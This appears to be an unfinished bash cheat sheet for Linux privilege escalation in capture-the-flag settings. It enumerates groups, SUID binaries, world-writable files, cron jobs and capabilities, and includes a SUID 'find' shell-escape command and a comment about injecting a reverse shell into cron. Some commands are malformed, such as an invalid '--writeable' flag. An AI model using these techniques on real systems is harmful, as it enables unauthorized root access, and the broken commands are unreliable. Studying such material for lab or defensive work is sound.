#!/bin/bash

# this script is for find possible method for linux privilege escaltion

# find total groups in system we are
groups
# docker → root access via container
# lxd → mount host filesystem
# sudo → obvious
# adm → read logs (may leak creds)
# disk → raw disk access

# find all files and directory which our group access
groups | tr ' ' '\n' | xargs -I {} find / -type f -group {}
groups | tr ' ' '\n' | xargs -I {} find / -type d -group {}

# see all groups present in system
cat /etc/group

# find SUID (set user ID) && SGID (set group ID)
find / -perm -u=s -type f 2>/dev/null
find . -exec /bin/sh \;
	 # if find any such file then read the content and give flag

# find files with 777(all have rwx) 444(all have r) permissions
find / -type f -perm 777 -exec ls -la {} + 2>/dev/null
find / -type f -perm 444 -exec ls -la {} \; 2>/dev/null 

# find files with 777(iiiall have rwx) 444(all have r) permissions
find / -type d -perm 777 -exec ls -la {} + 2>/dev/null
find / -type d -perm 444 -exec ls -la {} \; 2>/dev/null 

# writeable files
find / -type f --writeable


# cron jobs
 cat /etc/crontab
	# add scirpt to modify cronjobs and inject reverse shell
# kernel exploit 
 uname -a

#  sudo misconfiguration

# Capabilities
getcap -r / 2>/dev/null


# NFS 
